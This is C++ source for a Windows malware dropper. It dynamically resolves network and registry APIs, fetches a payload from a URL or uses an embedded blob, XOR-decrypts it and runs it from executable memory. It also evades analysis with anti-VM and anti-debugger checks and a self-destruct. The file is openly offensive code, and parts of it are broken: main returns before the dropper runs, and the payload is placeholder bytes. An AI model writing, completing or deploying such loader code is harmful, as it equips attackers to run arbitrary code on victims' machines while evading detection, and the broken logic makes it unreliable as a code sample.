#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <unordered_map>
#include <functional>
#include <filesystem>
#include <wininet.h>
#include <stdexcept>
#include <memory>
#include "antiv2.h"

// Typedefs for Windows API functions
typedef BOOL(WINAPI* tInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* tInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD);
typedef BOOL(WINAPI* tInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* tRegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPCSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LONG(WINAPI* tRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef HANDLE(WINAPI* tCreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);

typedef void (*tPayloadMain)();

// DECLARATIONS
void initializeContext();
void logError(const std::string& message);
void cleanup();
bool initializeMutex();
bool initializeInternet();
std::vector<char> downloadPayload();
std::vector<char> getEmbeddedPayload();
void decryptPayload(std::vector<char>& payload);
bool executePayload(const std::vector<char>& payload);

class Dropper {
public:
    explicit Dropper(bool useEmbeddedPayload = true) : useEmbeddedPayload(useEmbeddedPayload) {
        loadLibraries();
    }

    ~Dropper() {
        cleanup();
    }

    void run() {
        if (!initializeMutex() || !initializeInternet()) {
            return;
        }

        auto&& payload = useEmbeddedPayload ? getEmbeddedPayload() : downloadPayload();
        if (payload.empty()) {
            logError("No payload found.");
            return;
        }

        decryptPayload(payload);

        try {
            reinterpret_cast<tPayloadMain>(payload.data())();
        } catch (const std::exception& e) {
            logError("Payload execution failed: " + std::string(e.what()));
        }

        cleanup();
    }


private:
    HMODULE hKernel32 = nullptr, hAdvapi32 = nullptr, hWininet = nullptr;
    tInternetOpenA pInternetOpenA = nullptr;
    tInternetOpenUrlA pInternetOpenUrlA = nullptr;
    tInternetReadFile pInternetReadFile = nullptr;
    tRegCreateKeyExA pRegCreateKeyExA = nullptr;
    tRegSetValueExA pRegSetValueExA = nullptr;
    tCreateMutexA pCreateMutexA = nullptr;
    HANDLE hMutex = nullptr;
    HINTERNET hInet = nullptr;
    bool useEmbeddedPayload;

    void loadLibraries() {
        hKernel32 = GetModuleHandleA("kernel32.dll");
        hAdvapi32 = GetModuleHandleA("advapi32.dll");
        hWininet = GetModuleHandleA("wininet.dll");

        if (!hKernel32 || !hAdvapi32 || !hWininet) {
            logError("Failed to load necessary DLLs.");
            throw std::runtime_error("Critical DLL load failure");
        }

        pInternetOpenA = reinterpret_cast<tInternetOpenA>(GetProcAddress(hWininet, "InternetOpenA"));
        pInternetOpenUrlA = reinterpret_cast<tInternetOpenUrlA>(GetProcAddress(hWininet, "InternetOpenUrlA"));
        pInternetReadFile = reinterpret_cast<tInternetReadFile>(GetProcAddress(hWininet, "InternetReadFile"));
        pRegCreateKeyExA = reinterpret_cast<tRegCreateKeyExA>(GetProcAddress(hAdvapi32, "RegCreateKeyExA"));
        pRegSetValueExA = reinterpret_cast<tRegSetValueExA>(GetProcAddress(hAdvapi32, "RegSetValueExA"));
        pCreateMutexA = reinterpret_cast<tCreateMutexA>(GetProcAddress(hKernel32, "CreateMutexA"));

        if (!pInternetOpenA || !pInternetOpenUrlA || !pInternetReadFile ||
            !pRegCreateKeyExA || !pRegSetValueExA || !pCreateMutexA) {
            logError("Failed to get function pointers.");
            throw std::runtime_error("Critical function pointer resolution failure");
        }
    }

    void logError(const std::string& message) {
        std::cerr << "[ERROR] " << message << std::endl;
    }

    bool initializeMutex() {
        hMutex = pCreateMutexA(nullptr, FALSE, "MyMutex");

        if (!hMutex || GetLastError() == ERROR_ALREADY_EXISTS) {
            logError("Another instance is already running.");
            return false;
        }
        return true;
    }

    BOOL internetOpenResult = pInternetOpenA("MyAgent", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    bool initializeInternet() {
        if (!internetOpenResult) {
            logError("Failed to initialize Internet.");
            return false;
        }
        return true;
    }
    std::vector<char> downloadPayload() {
        char buffer[1024];
        DWORD bytesRead = 0;
        std::vector<char> payload;

        HINTERNET hUrl = pInternetOpenUrlA(hInet, "http://example.com/payload", nullptr, 0, INTERNET_FLAG_RELOAD, 0);
        if (!hUrl) {
            logError("Failed to open URL.");
            return {};
        }

        while (pInternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            payload.insert(payload.end(), buffer, buffer + bytesRead);
        }

        InternetCloseHandle(hUrl);

        if (payload.empty()) {
            logError("Failed to download payload.");
        }

        return payload;
    }

    std::vector<char> getEmbeddedPayload() {
        const unsigned char embeddedPayload[] = {
            // Add real embedded payload data here
            0x9b, 0x80, 0xe0, 0x73, 0x74, 0x69, 0x0e, 0xfd // Example data
        };
        return std::vector<char>(embeddedPayload, embeddedPayload + sizeof(embeddedPayload));
    }

    void decryptPayload(std::vector<char>& payload) {
        const char key[] = "ghostintheshell!"; // Simple XOR key for encryption
        size_t keyLength = strlen(key);

        for (size_t i = 0; i < payload.size(); i++) {
            payload[i] ^= key[i % keyLength];
        }
    }

    bool executePayload(const std::vector<char>& payload) {
        LPVOID pMemory = VirtualAlloc(nullptr, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pMemory) {
            logError("Failed to allocate memory for payload.");
            return false;
        }

        memcpy(pMemory, payload.data(), payload.size());
        tPayloadMain payloadMain = reinterpret_cast<tPayloadMain>(pMemory);

        try {
            payloadMain();
        } catch (...) {
            logError("Exception occurred during payload execution.");
        }

        VirtualFree(pMemory, 0, MEM_RELEASE);
        return true;
    }

    void cleanup() {
        if (hMutex) CloseHandle(hMutex);
        if (hInet) InternetCloseHandle(hInet);
    }
};

int main() {
    try {
        // Run all combined detection checks
        if (combinedDetection()) {
            std::cout << "System is clear, no VM or debugger detected." << std::endl;
        }
    } catch (const AntiVMException& e) {
        std::cerr << "Error: " << e.what() << " Code: " << e.getErrorCode() << std::endl;
        self_destruct();
    }

    // Normal operation continues here
    std::cout << "Normal operation continues..." << std::endl;
    return 0;
    try { Dropper dropper(true); // Use embedded payload by default
        dropper.run();
    } catch (const AntiVMException& e) {
        std::cerr << "Error: " << e.what() << " (Code: " << e.getErrorCode() << ")" << std::endl;
        return 1;
    } catch (const std::exception& ex) {
        std::cerr << "Exception: " << ex.what() << std::endl;
    }
    return 0;
}